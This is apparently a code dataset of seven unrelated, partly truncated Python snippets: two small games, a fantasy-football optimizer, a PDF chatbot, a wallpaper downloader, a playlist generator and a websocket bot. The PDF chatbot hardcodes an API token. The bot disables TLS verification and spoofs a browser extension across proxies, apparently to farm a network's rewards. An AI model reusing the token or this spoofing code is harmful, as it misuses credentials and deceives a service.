    "import pygame\n\nclass Fighter():\n  def __init__(self, player, x, y, flip, data, sprite_sheet, animation_steps, sound):\n    self.player = player\n    self.size = data[0]\n    self.image_scale = data[1]\n    self.offset = data[2]\n    self.flip = flip\n    self.animation_list = self.load_images(sprite_sheet, animation_steps)\n    self.action = 0#0:idle #1:run #2:jump #3:attack1 #4: attack2 #5:hit #6:death\n    self.frame_index = 0\n    self.image = self.animation_list[self.action][self.frame_index]\n    self.update_time = pygame.time.get_ticks()\n    self.rect = pygame.Rect((x, y, 80, 180))\n    self.vel_y = 0\n    self.running = False\n    self.jump = False\n    self.attacking = False\n    self.attack_type = 0\n    self.attack_cooldown = 0\n    self.attack_sound = sound\n    self.hit = False\n    self.health = 100\n    self.alive = True\n\n\n  def load_images(self, sprite_sheet, animation_steps):\n    #extract images from spritesheet\n    animation_list = []\n    for y, animation in enumerate(animation_steps):\n      temp_img_list = []\n      for x in range(animation):\n        temp_img = sprite_sheet.subsurface(x * self.size, y * self.size, self.size, self.size)\n        temp_img_list.append(pygame.transform.scale(temp_img, (self.size * self.image_scale, self.size * self.image_scale)))\n      animation_list.append(temp_img_list)\n    return animation_list\n\n\n  def move(self, screen_width, screen_height, surface, target, round_over):\n    SPEED = 10\n    GRAVITY = 2\n    dx = 0\n    dy = 0\n    self.running = False\n    self.attack_type = 0\n\n    #get keypresses\n    key = pygame.key.get_pressed()\n\n    #can only perform other actions if not currently attacking\n    if self.attacking == False and self.alive == True and round_over == False:\n      #check player 1 controls\n      if self.player == 1:\n        #movement\n        if key[pygame.K_a]:\n          dx = -SPEED\n          self.running = True\n        if key[pygame.K_d]:\n          dx = SPEED\n          self.running = True\n        #jump\n        if key[pygame.K_w] and self.jump == False:\n          self.vel_y = -30\n          self.jump = True\n        #attack\n        if key[pygame.K_r] or key[pygame.K_t]:\n          self.attack(target)\n          #determine which attack type was used\n          if key[pygame.K_r]:\n            self.attack_type = 1\n          if key[pygame.K_t]:\n            self.attack_type = 2\n\n\n      #check player 2 controls\n      if self.player == 2:\n        #movement\n        if key[pygame.K_LEFT]:\n          dx = -SPEED\n          self.running = True\n        if key[pygame.K_RIGHT]:\n          dx = SPEED\n          self.running = True\n        #jump\n        if key[pygame.K_UP] and self.jump == False:\n          self.vel_y = -30\n          self.jump = True\n        #attack\n        if key[pygame.K_KP1] or key[pygame.K_KP2]:\n          self.attack(target)\n          #determine which attack type was used\n          if key[pygame.K_KP1]:\n            self.attack_type = 1\n          if key[pygame.K_KP2]:\n            self.attack_type = 2\n\n\n    #apply gravity\n    self.vel_y += GRAVITY\n    dy += self.vel_y\n\n    #ensure player stays on screen\n    if self.rect.left + dx < 0:\n      dx = -self.rect.left\n    if self.rect.right + dx > screen_width:\n      dx = screen_width - self.rect.right\n    if self.rect.bottom + dy > screen_height - 110:\n      self.vel_y = 0\n      self.jump = False\n      dy = screen_height - 110 - self.rect.bottom\n\n    #ensure players face each other\n    if target.rect.centerx > self.rect.centerx:\n      self.flip = False\n    else:\n      self.flip = True\n\n    #apply attack cooldown\n    if self.attack_cooldown > 0:\n      self.attack_cooldown -= 1\n\n    #update player position\n    self.rect.x += dx\n    self.rect.y += dy\n\n\n  #handle animation updates\n  def update(self):\n    #check what action the player is performing\n    if self.health <= 0:\n      self.health = 0\n      self.alive = False\n      self.update_action(6)#6:death\n    elif self.hit == True:\n      self.update_action(5)#5:hit\n    elif self.attacking == True:\n      if self.attack_type == 1:\n        self.update_action(3)#3:attack1\n      elif self.attack_type == 2:\n        self.update_action(4)#4:attack2\n    elif self.jump == True:\n      self.update_action(2)#2:jump\n    elif self.running == True:\n      self.update_action(1)#1:run\n    else:\n      self.update_action(0)#0:idle\n\n    animation_cooldown = 50\n    #update image\n    self.image = self.animation_list[self.action][self.frame_index]\n    #check if enough time has passed since the last update\n    if pygame.time.get_ticks() - self.update_time > animation_cooldown:\n      self.frame_index += 1\n      self.update_time = pygame.time.get_ticks()\n    #check if the animation has finished\n    if self.frame_index >= len(self.animation_list[self.action]):\n      #if the player is dead then end the animation\n      if self.alive == False:\n        self.frame_index = len(self.animation_list[self.action]) - 1\n      else:\n        self.frame_index = 0\n        #check if an attack was executed\n        if self.action == 3 o",
    "import math\r\nimport os\r\nimport random\r\nimport sys\r\nimport time\r\n\r\nimport pyglet\r\nfrom pyglet.gl import *\r\n#from pyglet import resource\r\nfrom pyglet.window import key\r\nfrom pyglet import font\r\nfrom pyglet import media\r\nfrom pyglet.font import ttf\r\nfrom pyglet.sprite import Sprite\r\nfrom OpenGL.GL import *\r\n# from OpenGL.GLU import *\r\nimport text_input\r\nimport load_resources\r\n\r\n#-----------------------------------------------------------\r\n# VARIABLES\r\n#-----------------------------------------------------------\r\n\r\n#print(load_resources.x)\r\n\r\nWINDOW_WIDTH = 400\r\nWINDOW_HEIGHT = 600\r\n\r\nMAX_DIFFICULTY = 2\r\nMAX_CHARACTER = 14\r\n\r\nin_game = False\r\nin_main_menu = True\r\n\r\nobstacleSpawnWidth = [50,350]\r\nobstacles = []\r\nclocks = [pyglet.clock.Clock()]\r\ndifficulty = 3 #changes depending on selection\r\nkeys = key.KeyStateHandler()\r\n\r\nstats_multiplier = [1, 1.1, 1.2, 1.3, 1.5,\r\n\t\t\t\t\t1, 1.75, 2, 1.75, 2.3,\r\n\t\t\t\t\t2.5, 2.3, 2.7, 3]\r\n\r\nanimals_names = ['SISIW', 'DAGA', 'PALAKA', 'UNGGOY', 'BAKA',\r\n\t\t\t\t'PUSA', 'ASO', 'USO', 'LOBO', 'OSO',\r\n\t\t\t\t'KOALA', 'PANDA', 'TIGRE', 'LEON']\r\nanimals_price_list = [0, 100, 200, 300, 500, 700, 900, 1200, 1500, 1800, 2200, 2600, 3000, 4000]\r\n\r\nanimals = []\r\n\r\nanimals.append(load_resources.sisiw_01)\r\nanimals.append(load_resources.daga_02)\r\nanimals.append(load_resources.palaka_03)\r\nanimals.append(load_resources.unggoy_04)\r\nanimals.append(load_resources.baka_05)\r\nanimals.append(load_resources.pusa_06)\r\nanimals.append(load_resources.aso_07)\r\nanimals.append(load_resources.uso_08)\r\nanimals.append(load_resources.lobo_09)\r\nanimals.append(load_resources.oso_10)\r\nanimals.append(load_resources.koala_11)\r\nanimals.append(load_resources.panda_12)\r\nanimals.append(load_resources.tigre_13)\r\nanimals.append(load_resources.leon_14)\r\n\r\n#-----------------------------------------------------------\r\n# GAME OBJECTS\r\n#-----------------------------------------------------------\r\n\r\n# for center-anchoring of images\r\ndef center_anchor(img):\r\n\timg.anchor_x = img.width // 2\r\n\timg.anchor_y = img.height // 2\r\n\r\n\r\n# for sprites\r\nclass GameObject():\r\n\r\n\tdef __init__(self, posx, posy, sprite = None):\r\n\t\tself.posx = posx\r\n\t\tself.posy = posy\r\n\t\tself.velx = 0\r\n\t\tself.vely = 0\r\n\t\tif sprite is not None:\r\n\t\t\tself.sprite = sprite\r\n\t\t\tself.sprite.x = self.posx\r\n\t\t\tself.sprite.y = self.posy\r\n\r\n\tdef draw(self):\r\n\t\tself.sprite.draw()\r\n\r\n\tdef update(self, dt):\r\n\t\tself.posx += self.velx*dt\r\n\t\tself.posy += self.vely*dt\r\n\t\tself.sprite.x = self.posx\r\n\t\tself.sprite.y = self.posy\r\n\r\n#-----------------------------------------------------------\r\n# SCREEN OVERLAYS\r\n#-----------------------------------------------------------\r\n\r\n# game window + infinite scrolling bg\r\nclass GameWindow(pyglet.window.Window):\r\n\tdef __init__(self, *args, **kwargs):\r\n\t\tsuper().__init__(*args, **kwargs)\r\n\t\tself.bg_img = load_resources.main_menu_bg\r\n\t\tself.bg_list = []\r\n\t\t\r\n\t\tfor i in range(2):\r\n\t\t\tself.bg_list.append(GameObject(i*1200, 0, Sprite(self.bg_img)))\r\n\r\n\t\tfor bg in load_resources.bg_list:\r\n\t\t\tbg.velx = -50\r\n\r\n\tdef draw(self):\r\n\t\tself.clear()\r\n\t\tfor bg in self.bg_list:\r\n\t\t\tbg.draw()\r\n\r\n\r\n\tdef update_bg(self, dt):\r\n\t\tfor bg in self.bg_list:\r\n\t\t\tbg.update(dt)\r\n\t\t\tif bg.posx <= -1300:\r\n\t\t\t\tself.bg_list.remove(bg)\r\n\t\t\t\tself.bg_list.append(GameObject(1100, 0, Sprite(self.bg_img)))\r\n\t\t\tbg.velx = -50\r\n\r\n\r\n\tdef update(self, dt):\r\n\t\tglobal in_game\r\n\r\n\t\tself.update_bg(dt)\r\n\r\n# Overlay - scene-changing class\t\r\nclass Overlay(object):\r\n\tdef update(self, dt):\r\n\t\tpass\r\n\r\n\tdef draw(self):\r\n\t\tpass\r\n\r\n# Menu\r\nclass Menu(Overlay):\r\n\tdef __init__(self, x, y, title):\r\n\t\tself.x = x\r\n\t\tself.y = y\r\n\t\tself.items = []\r\n\t\tself.title_text = GameObject(x, y, Sprite(title))\r\n\t\t\r\n\tdef reset(self):\r\n\t\tself.selected_index = 0\r\n\t\tself.items[self.selected_index].selected = True\r\n\r\n\t# put on_key_press and on_key_release under classes\r\n\tdef on_key_press(self, symbol, modifiers):\r\n\t\tif symbol == key.DOWN:\r\n\t\t\tself.selected_index += 1\r\n\t\telif symbol == key.UP:\r\n\t\t\tself.selected_index -= 1\r\n\t\tself.selected_index = min(max(self.selected_index, 0), len(self.items) - 1)\r\n\r\n\t\tif symbol in (key.DOWN, key.UP) and enable_sound:\r\n\t\t\tload_resources.button_sound.play()\r\n\r\n\tdef on_key_release(self, symbol, modifiers):\r\n\t\tself.items[self.selected_index].on_key_release(symbol, modifiers)\r\n\r\n\tdef draw(self):\r\n\t\tself.title_text.draw()\r\n\t\tfor i, item in enumerate(self.items):\r\n\t\t\titem.draw(i == self.selected_index)\r\n\r\n# Menu items (non-toggle)\r\nclass MenuItem(object):\r\n\tpointer_color = (1.0, 1.0, 1.0)\r\n\tinverted_pointers = False\r\n\r\n\tdef __init__(self, img, y, activate_func):\r\n\t\tcenter_anchor(img)\r\n\t\tself.y = y\r\n\t\tself.x = WINDOW_WIDTH//2\r\n\t\tself.img = img\r\n\t\tself.text = GameObject(self.x, self.y, Sprite(img))\r\n\t\tself.activate_func = activate_func\r\n\r\n\tdef draw_pointer(self, x, y, color, flip=False):\r\n\t\t# color the pointer image to a color\r\n\r\n\t\t# glPushAttrib(GL_CURRENT_BIT)\r\n\t\t# glColor3f(*color)\r\n\r\n\t\tif flip:\r\n\t\t\tload_resources.pointer_image_flip.blit(x, y)\r\n\t\telse:\r\n\t\t\tload_resources.pointer_image.blit(x, y)\r\n\r\n\t\t# glPop",
    "import os\nimport httpx\nimport pandas as pd\nfrom pulp import *\nfrom pathlib import Path\n\n\n# current_dir = os.path.dirname(__file__).split(\"/\")[:-1]\n# current_dir = \"/\".join(current_dir\ncurrent_dir = os.path.dirname(__file__)\n\n\ndef get_unplaying_players():\n    \"\"\"Get the list of players who are not playing in the next gameweek.\n    Returns:\n        list: A list of players who are not playing in the next gameweek.\n    \"\"\"\n    general_info = httpx.get(\n        f\"https://fantasy.premierleague.com/api/bootstrap-static/\"\n    ).json()\n\n    unplaying_players = []\n    for element in general_info[\"elements\"]:\n        if element['chance_of_playing_this_round'] == 0:\n            first_name = element[\"first_name\"]\n            second_name = element[\"second_name\"]\n            unplaying_players.append(\n                {\"id\": element[\"id\"],\n                 \"name\": f\"{first_name} {second_name}\"\n                 })\n    return unplaying_players\n\n\ndef get_unplaying_clubs():\n    \"\"\"\n    Get the list of clubs that are not playing in the next gameweek.\n    Returns:\n        list: A list of clubs that are not playing in the next gameweek.\"\"\"\n    general_info = httpx.get(\n        f\"https://fantasy.premierleague.com/api/bootstrap-static/\"\n    ).json()\n    unplaying_clubs = []\n    for team in general_info[\"teams\"]:\n        if team[\"unavailable\"] == \"True\":\n            unplaying_clubs.append(team[\"name\"])\n    return unplaying_clubs\n\n\nunavailable = [player[\"name\"] for player in get_unplaying_players()]\nunplaying_clubs = []\n\n\ndef load_predictions(GW, specific_players=None):\n    \"\"\"Load the predictions for a particular gameweek.\n    Args:\n        GW (int): The gameweek to get the predictions for.\n    Returns:\n        pd.DataFrame: A dataframe containing the predictions for the gameweek.\"\"\"\n\n    predicted_fwds = pd.read_csv(\n        current_dir+f\"/predicted_dataset/GW{GW}/forwards_points.csv\", index_col=0).sort_values(\"points\", ascending=False)\n    predicted_fwds[\"position\"] = \"FWD\"\n    predicted_defs = pd.read_csv(\n        current_dir+f\"/predicted_dataset/GW{GW}/defenders_points.csv\", index_col=0)\n    predicted_defs[\"position\"] = \"DEF\"\n    predicted_mids = pd.read_csv(\n        current_dir+f\"/predicted_dataset/GW{GW}/midfielders_points.csv\", index_col=0)\n    predicted_mids[\"position\"] = \"MID\"\n    predicted_gks = pd.read_csv(\n        current_dir+f\"/predicted_dataset/GW{GW}/goalkeepers_points.csv\", index_col=0)\n    predicted_gks[\"position\"] = \"GK\"\n    predictions = pd.concat([predicted_fwds, predicted_defs,\n                             predicted_mids, predicted_gks])\n    predictions = predictions[~predictions[\"name\"].isin(unavailable)]\n    predictions = predictions[~predictions[\"team\"].isin(unplaying_clubs)]\n    predictions.sort_values(\"points\", ascending=False, inplace=True)\n    if specific_players:\n        predictions = predictions[predictions[\"name\"].isin(specific_players)]\n    return predictions\n\n\ndef load_fixture(GW, specific_players=None):\n    \"\"\"Load the predictions for a particular gameweek.\n    Args:\n        GW (int): The gameweek to get the predictions for.\n    Returns:\n        pd.DataFrame: A dataframe containing the predictions for the gameweek.\"\"\"\n    if specific_players:\n        if \"Son Heung min\" in specific_players:\n            specific_players.remove(\"Son Heung min\")\n            specific_players.append(\"Son Heung-min\")\n    fixture = pd.read_csv(current_dir +\n                          f\"/datasets/2023-24/fixtures/GW{GW}.csv\")\n    if specific_players:\n        fixture = fixture[fixture[\"name\"].isin(specific_players)]\n    return fixture\n\n\ndef load_predictions_unconcat(GW, specific_players=None):\n    predicted_fwds = pd.read_csv(\n        current_dir+f\"/predicted_dataset/GW{GW}/forwards_points.csv\", index_col=0)\n    predicted_fwds = predicted_fwds[~predicted_fwds[\"name\"].isin(unavailable)]\n    predicted_fwds = predicted_fwds[~predicted_fwds[\"team\"].isin(\n        unplaying_clubs)].sort_values(\"points\", ascending=False)\n\n    predicted_defs = pd.read_csv(\n        current_dir+f\"/predicted_dataset/GW{GW}/defenders_points.csv\", index_col=0)\n    predicted_defs = predicted_defs[~predicted_defs[\"name\"].isin(unavailable)]\n    predicted_defs = predicted_defs[~predicted_defs[\"team\"].isin(\n        unplaying_clubs)].sort_values(\"points\", ascending=False)\n\n    predicted_mids = pd.read_csv(\n        current_dir+f\"/predicted_dataset/GW{GW}/midfielders_points.csv\", index_col=0)\n    predicted_mids = predicted_mids[~predicted_mids[\"name\"].isin(unavailable)]\n    predicted_mids = predicted_mids[~predicted_mids[\"team\"].isin(\n        unplaying_clubs)].sort_values(\"points\", ascending=False)\n\n    predicted_gks = pd.read_csv(\n        current_dir+f\"/predicted_dataset/GW{GW}/goalkeepers_points.csv\", index_col=0)\n    predicted_gks = predicted_gks[~predicted_gks[\"name\"].isin(unavailable)]\n    predicted_gks = predicted_gks[~predicted_gks[\"team\"].isin(\n        unplaying_clubs)].sort_values(\"points\", ascending=False)\n\n    if specific_players:\n        predicted_fwds ",
    "import streamlit as st\r\nfrom PyPDF2 import PdfReader\r\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\r\nfrom langchain.chains.question_answering import load_qa_chain\r\nfrom langchain_community.embeddings import HuggingFaceEmbeddings\r\nfrom langchain_community.vectorstores import FAISS\r\nfrom langchain_community.llms import OpenAI\r\nfrom langchain_community.callbacks import get_openai_callback\r\nfrom langchain import HuggingFaceHub\r\n\r\n\r\n# Function to process PDF and return text chunks\r\ndef process_pdf(pdf_file, max_pages=50):\r\n    pdf_reader = PdfReader(pdf_file)\r\n    text = ''\r\n    cnt = 0\r\n    for page in pdf_reader.pages:\r\n        text += page.extract_text()\r\n        cnt += 1\r\n        if cnt >= max_pages:\r\n            break\r\n\r\n    text_splitter = RecursiveCharacterTextSplitter(\r\n        chunk_size=500,\r\n        chunk_overlap=50,\r\n        length_function=len\r\n    )\r\n    chunks = text_splitter.split_text(text=text)\r\n    return chunks\r\n\r\n# Function to load model and run QA\r\ndef run_qa(chunks, query):\r\n    embeddings = HuggingFaceEmbeddings(model_name='sentence-transformers/all-MiniLM-L6-v2',\r\n                                       model_kwargs={'device': 'cpu'})\r\n    VectorStore = FAISS.from_texts(chunks, embedding=embeddings)\r\n    docs = VectorStore.similarity_search(query=query, k=3)\r\n    llm = HuggingFaceHub(huggingfacehub_api_token='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',\r\n                          repo_id=\"google/flan-t5-xxl\",\r\n                          model_kwargs={\"temperature\": 0.7, \"max_length\":4096}) \r\n    chain = load_qa_chain(llm=llm, chain_type=\"stuff\")\r\n    response = chain.run(input_documents=docs, question=query, max_length=4096)  \r\n    return response\r\n\r\n# Main Streamlit app\r\ndef main():\r\n    st.title(\"PDF Question Answering Chatbot\")\r\n\r\n    # Define placeholder for chat history\r\n    if 'chat_history' not in st.session_state:\r\n        st.session_state.chat_history = []\r\n\r\n    # File upload\r\n    uploaded_file = st.file_uploader(\"Upload a PDF\", type=[\"pdf\"])\r\n\r\n    if uploaded_file:\r\n        st.markdown(\"---\")\r\n\r\n        # Process PDF when uploaded\r\n        chunks = process_pdf(uploaded_file)\r\n\r\n        # Display chat history\r\n        st.markdown(\"<h3 style='color: #008080;'>Chat History:</h3>\", unsafe_allow_html=True)\r\n        for idx, (query, response) in enumerate(st.session_state.chat_history):\r\n            st.markdown(f\"<p style='color: #000080;'>User {idx + 1}: {query}</p>\", unsafe_allow_html=True)\r\n            st.markdown(f\"<p style='color: #800000;'>Chatbot {idx + 1}: {response}</p>\", unsafe_allow_html=True)\r\n            st.markdown(\"---\")\r\n\r\n        # Ask a question\r\n        user_input = st.text_area(\"Ask a question\", key=\"user_input\")\r\n\r\n        if st.button(\"Ask\"):\r\n            question = st.session_state[\"user_input\"]\r\n            response = run_qa(chunks, question)\r\n            st.session_state.chat_history.append((question, response))\r\n\r\n            # Display the response\r\n            st.markdown(\"<h3 style='color: #008080;'>Chatbot Response:</h3>\", unsafe_allow_html=True)\r\n            st.markdown(f\"<p style='color: #800000;'>{response}</p>\", unsafe_allow_html=True)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import tkinter as tk\nfrom tkinter import filedialog\nfrom pathlib import Path\nfrom string import ascii_letters, digits\nfrom random import choice\nfrom os import system, name\nfrom time import sleep\nfrom requests import get\n\nscript_version = '1.0'\nscript_title = 'Unsplash WP Downloader by ALIILAPRO (version {})'.format(script_version)\n\ndef start_script():\n    system('title ' + script_title if name == 'nt' else 'PS1=\"\\[\\e]0;' + script_title + '\\a\\]\"; echo $PS1')\n    system('cls' if name == 'nt' else 'clear')\n    print(f'''\n    ..: {script_title} :..\n\n    [!] ABOUT SCRIPT:\n    [-] With this script, you can download wallpaper from site unsplash.com\n    [-] Version: {script_version}\n    --------\n    [!] ABOUT CODER:\n    [-] phnxXD, Programmer and developer from INDIA.\n    [-] Website : phnxXD\n    [-] Telegram : phnxXD\n    --------\n    ''')\n\ndef genString(stringLength):\n    letters = ascii_letters + digits\n    return ''.join(choice(letters) for i in range(stringLength))\n\ndef req(url):\n    try:\n        r = get(url)\n    except:\n        r = get(url)\n    return r\n\ndef download():\n    try:\n        DOWNLOAD_FOLDER = download_folder.get()\n        BASE_URL = 'https://source.unsplash.com'\n        RES_URL = '1920x1080'\n        num_images = int(num_images_entry.get())\n        KEYWORDS = ['HD Wallpapers', 'Experimental', 'hope', 'travel', 'dark']\n        Path(DOWNLOAD_FOLDER).mkdir(parents=True, exist_ok=True)\n        for _ in range(num_images):\n            FILE_NAME = 'unsplash-{}.jpg'.format(genString(7))\n            FILE_PATH = '{}/{}'.format(DOWNLOAD_FOLDER, FILE_NAME)\n            URL = '{}/{}/?{}'.format(BASE_URL, RES_URL, choice(KEYWORDS))\n            img_data = req(URL).content\n            with open(FILE_PATH, 'wb') as handler:\n                handler.write(img_data)\n        status_label.config(text=\"Wallpapers downloaded successfully!\")\n    except Exception as error:\n        status_label.config(text=\"Error occurred: \" + str(error))\n\ndef select_directory():\n    folder_path = filedialog.askdirectory()\n    download_folder.set(folder_path)\n\n# Create the main window\nroot = tk.Tk()\nroot.title(script_title)\n\n# Create and place widgets\nstart_script()\n\ndownload_folder = tk.StringVar()\n\nfolder_label = tk.Label(root, text=\"Select Download Directory:\")\nfolder_label.pack()\n\nselect_button = tk.Button(root, text=\"Select Directory\", command=select_directory)\nselect_button.pack()\n\nnum_images_label = tk.Label(root, text=\"Number of Images to Generate:\")\nnum_images_label.pack()\n\nnum_images_entry = tk.Entry(root)\nnum_images_entry.pack()\n\nnum_images_entry.insert(0, \"10\")  # Default value\n\ndownload_button = tk.Button(root, text=\"Generate and Download\", command=download)\ndownload_button.pack()\n\nstatus_label = tk.Label(root, text=\"\")\nstatus_label.pack()\n\nroot.mainloop()\n",
    "import argparse\nimport datetime\nimport json\nimport logging\nimport os\n\nimport openai\nimport spotipy\nfrom dotenv import load_dotenv\n\nlog = logging.getLogger(__name__)\nlogging.basicConfig(level=logging.INFO)\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Simple command line utility\")\n    parser.add_argument(\"-p\", type=str, help=\"The prompt to describing the playlist.\")\n    parser.add_argument(\n        \"-n\", type=int, default=\"12\", help=\"The number of songs to be added.\"\n    )\n    parser.add_argument(\n        \"-envfile\",\n        type=str,\n        default=\".env\",\n        required=False,\n        help='A dotenv file with your environment variables: \"SPOTIFY_CLIENT_ID\", \"SPOTIFY_CLIENT_SECRET\", \"OPENAI_API_KEY\"',\n    )\n\n    args = parser.parse_args()\n    load_dotenv(args.envfile)\n\n    if any(\n        [\n            x not in os.environ\n            for x in (\"SPOTIFY_CLIENT_ID\", \"SPOTIFY_CLIENT_SECRET\", \"OPENAI_API_KEY\")\n        ]\n    ):\n        raise ValueError(\n            \"Error: missing environment variables. Please check your env file.\"\n        )\n\n    openai.api_key = os.environ[\"OPENAI_API_KEY\"]\n\n    if args.n not in range(1, 50):\n        raise ValueError(\"Error: n should be between 0 and 50\")\n\n    playlist_prompt = args.p\n    count = args.n\n    playlist = get_playlist(playlist_prompt, count)\n    add_songs_to_spotify(playlist_prompt, playlist)\n\n\ndef get_playlist(prompt, count=8):\n    example_json = \"\"\"\n    [\n      {\"song\": \"Everybody Hurts\", \"artist\": \"R.E.M.\"},\n      {\"song\": \"Nothing Compares 2 U\", \"artist\": \"Sinead O'Connor\"},\n      {\"song\": \"Tears in Heaven\", \"artist\": \"Eric Clapton\"},\n      {\"song\": \"Hurt\", \"artist\": \"Johnny Cash\"},\n      {\"song\": \"Yesterday\", \"artist\": \"The Beatles\"}\n    ]\n    \"\"\"\n    messages = [\n        {\n            \"role\": \"system\",\n            \"content\": \"\"\"You are a helpful playlist generating assistant.\n        You should generate a list of songs and their artists according to a text prompt.\n        Your should return a JSON array, where each element follows this format: {\"song\": <song_title>, \"artist\": <artist_name>}\n        \"\"\",\n        },\n        {\n            \"role\": \"user\",\n            \"content\": \"Generate a playlist of 5 songs based on this prompt: super super sad songs\",\n        },\n        {\"role\": \"assistant\", \"content\": example_json},\n        {\n            \"role\": \"user\",\n            \"content\": f\"Generate a playlist of {count} songs based on this prompt: {prompt}\",\n        },\n    ]\n\n    response = openai.chat.completions.create(\n        messages=messages, model=\"gpt-4\", max_tokens=400\n    )\n\n    playlist = json.loads(response.choices[0].message.content)\n    return playlist\n\n\ndef add_songs_to_spotify(playlist_prompt, playlist):\n    # Sign up as a developer and register your app at https://developer.spotify.com/dashboard/applications\n\n    # Step 1. Create an Application.\n\n    # Step 2. Copy your Client ID and Client Secret.\n    spotipy_client_id = os.environ[\n        \"SPOTIFY_CLIENT_ID\"\n    ]  # Use your Spotify API's keypair's Client ID\n    spotipy_client_secret = os.environ[\n        \"SPOTIFY_CLIENT_SECRET\"\n    ]  # Use your Spotify API's keypair's Client Secret\n\n    # Step 3. Click `Edit Settings`, add `http://localhost:9999` as as a \"Redirect URI\"\n    spotipy_redirect_url = \"http://localhost:9999\"  # Your browser will return page not found at this step. We'll grab the URL and paste back in to our console\n\n    # Step 4. Click `Users and Access`. Add your Spotify account to the list of users (identified by your email address)\n\n    # Spotipy Documentation\n    # https://spotipy.readthedocs.io/en/2.22.1/#getting-started\n\n    sp = spotipy.Spotify(\n        auth_manager=spotipy.SpotifyOAuth(\n            client_id=spotipy_client_id,\n            client_secret=spotipy_client_secret,\n            redirect_uri=spotipy_redirect_url,\n            scope=\"playlist-modify-private\",\n        )\n    )\n    current_user = sp.current_user()\n\n    assert current_user is not None\n\n    track_uris = []\n    for item in playlist:\n        artist, song = item[\"artist\"], item[\"song\"]\n        # https://developer.spotify.com/documentation/web-api/reference/#/operations/search\n\n        advanced_query = f\"artist:({artist}) track:({song})\"\n        basic_query = f\"{song} {artist}\"\n\n        for query in [advanced_query, basic_query]:\n            log.debug(f\"Searching for query: {query}\")\n            search_results = sp.search(\n                q=query, limit=10, type=\"track\"\n            )  # , market=market)\n\n            if (\n                not search_results[\"tracks\"][\"items\"]\n                or search_results[\"tracks\"][\"items\"][0][\"popularity\"] < 20\n            ):\n                continue\n            else:\n                good_guess = search_results[\"tracks\"][\"items\"][0]\n                print(f\"Found: {good_guess['name']} [{good_guess['id']}]\")\n                # print(f\"FOUND USING QUERY: {query}\")\n                track_uris.append(good_guess[\"id\"])\n                break\n\n        else:\n           ",
    "import asyncio\nimport random\nimport ssl\nimport json\nimport time\nimport uuid\nimport os\n\nimport websockets\nfrom loguru import logger\nfrom websockets_proxy import Proxy, proxy_connect\n\n\nasync def connect_to_wss(user_id):\n    logger.debug(\"NORMAL\")\n    device_id = str(uuid.uuid4())\n    logger.info(device_id)\n    while True:\n        try:\n            await asyncio.sleep(random.randint(1, 10) / 10)\n            custom_headers = {\n                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\"\n            }\n            ssl_context = ssl.create_default_context()\n            ssl_context.check_hostname = False\n            ssl_context.verify_mode = ssl.CERT_NONE\n            uri = \"wss://proxy.wynd.network:4650/\"\n            server_hostname = \"proxy.wynd.network\"\n            async with websockets.connect(uri, ssl=ssl_context, extra_headers=custom_headers,\n                                          server_hostname=server_hostname) as websocket:\n                async def send_ping():\n                    while True:\n                        send_message = json.dumps(\n                            {\"id\": str(uuid.uuid4()), \"version\": \"1.0.0\", \"action\": \"PING\", \"data\": {}})\n                        logger.debug(send_message)\n                        await websocket.send(send_message)\n                        await asyncio.sleep(20)\n\n                await asyncio.sleep(1)\n                asyncio.create_task(send_ping())\n\n                while True:\n                    response = await websocket.recv()\n                    message = json.loads(response)\n                    logger.info(message)\n                    if message.get(\"action\") == \"AUTH\":\n                        auth_response = {\n                            \"id\": message[\"id\"],\n                            \"origin_action\": \"AUTH\",\n                            \"result\": {\n                                \"browser_id\": device_id,\n                                \"user_id\": user_id,\n                                \"user_agent\": custom_headers['User-Agent'],\n                                \"timestamp\": int(time.time()),\n                                \"device_type\": \"extension\",\n                                \"version\": \"2.5.0\"\n                            }\n                        }\n                        logger.debug(auth_response)\n                        await websocket.send(json.dumps(auth_response))\n\n                    elif message.get(\"action\") == \"PONG\":\n                        pong_response = {\"id\": message[\"id\"], \"origin_action\": \"PONG\"}\n                        logger.debug(pong_response)\n                        await websocket.send(json.dumps(pong_response))\n        except Exception as e:\n            logger.error(e)\n\nasync def connect_to_wss_proxy(socks5_proxy, user_id):\n    logger.debug(\"PROXY\")\n    device_id = str(uuid.uuid3(uuid.NAMESPACE_DNS, socks5_proxy))\n    logger.info(device_id)\n    while True:\n        try:\n            await asyncio.sleep(random.randint(1, 10) / 10)\n            custom_headers = {\n                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\"\n            }\n            ssl_context = ssl.create_default_context()\n            ssl_context.check_hostname = False\n            ssl_context.verify_mode = ssl.CERT_NONE\n            uri = \"wss://proxy.wynd.network:4650/\"\n            server_hostname = \"proxy.wynd.network\"\n            proxy = Proxy.from_url(socks5_proxy)\n            async with proxy_connect(uri, proxy=proxy, ssl=ssl_context, server_hostname=server_hostname,\n                                     extra_headers=custom_headers) as websocket:\n                async def send_ping():\n                    while True:\n                        send_message = json.dumps(\n                            {\"id\": str(uuid.uuid4()), \"version\": \"1.0.0\", \"action\": \"PING\", \"data\": {}})\n                        logger.debug(send_message)\n                        await websocket.send(send_message)\n                        await asyncio.sleep(20)\n\n                # asyncio.create_task(send_http_request_every_10_seconds(socks5_proxy, device_id))\n                await asyncio.sleep(1)\n                asyncio.create_task(send_ping())\n\n                while True:\n                    response = await websocket.recv()\n                    message = json.loads(response)\n                    logger.info(message)\n                    if message.get(\"action\") == \"AUTH\":\n                        auth_response = {\n                            \"id\": message[\"id\"],\n                            \"origin_action\": \"AUTH\",\n                            \"result\": {\n                                \"browser_id\": device_id,\n                                \"user_id\": user_id,\n                                \"user_agent\": custom_headers['User-Agent'],\n                                \"timestamp\": int(time.time()),\n                                \"device_",
